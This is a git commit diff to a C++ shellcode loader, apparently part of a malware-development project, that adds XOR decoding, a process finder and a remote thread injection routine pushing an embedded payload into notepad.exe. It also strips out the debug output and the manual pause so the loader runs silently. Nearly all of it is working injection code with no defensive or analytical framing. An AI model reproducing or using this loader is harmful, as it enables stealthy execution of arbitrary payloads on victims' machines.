a1e7441fc8fc341d7698d7dd33c74b5d4265edde
tehstoni <stevenharrisskater66@hotmail.com>
2023-10-26 07:43:57 -0400

    Update porgram.cpp

--- seatoseaplusplus/Lowdar/porgram.cpp
+++ seatoseaplusplus/Lowdar/porgram.cpp
@@ -2,7 +2,70 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <tlhelp32.h>
 #include "resources.h"
+
+
+void XOR(char * data, size_t data_len, char * key, size_t key_len) {
+	int j;
+	
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
+
+
+int FindTarget(const char *procname) {
+
+        HANDLE hProcSnap;
+        PROCESSENTRY32 pe32;
+        int pid = 0;
+                
+        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+                
+        pe32.dwSize = sizeof(PROCESSENTRY32); 
+                
+        if (!Process32First(hProcSnap, &pe32)) {
+                CloseHandle(hProcSnap);
+                return 0;
+        }
+                
+        while (Process32Next(hProcSnap, &pe32)) {
+                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+                        pid = pe32.th32ProcessID;
+                        break;
+                }
+        }
+                
+        CloseHandle(hProcSnap);
+                
+        return pid;
+}
+
+int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+
+        LPVOID pRemoteCode = NULL;
+        HANDLE hThread = NULL;
+
+  
+        pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+        WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+        
+        hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+        if (hThread != NULL) {
+                WaitForSingleObject(hThread, 500);
+                CloseHandle(hThread);
+                return 0;
+        }
+        return -1;
+}
+
+
 
 int main(void) {
     
@@ -24,8 +87,7 @@ int main(void) {
 	
 	
 	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
-	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);
+
 
 	
 	RtlMoveMemory(exec_mem, payload, payload_len);
@@ -33,13 +95,26 @@ int main(void) {
 
 	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
-	printf("\nHit me!\n");
-	getchar();
-
 
 	if ( rv != 0 ) {
 			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 			WaitForSingleObject(th, -1);
+	}
+
+    	int pid = 0;
+    HANDLE hProc = NULL;
+
+	pid = FindTarget("notepad.exe");
+
+	if (pid) {
+		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+						FALSE, (DWORD) pid);
+
+		if (hProc != NULL) {
+			Inject(hProc, payload, payload_len);
+			CloseHandle(hProc);
+		}
 	}
 
 	return 0;
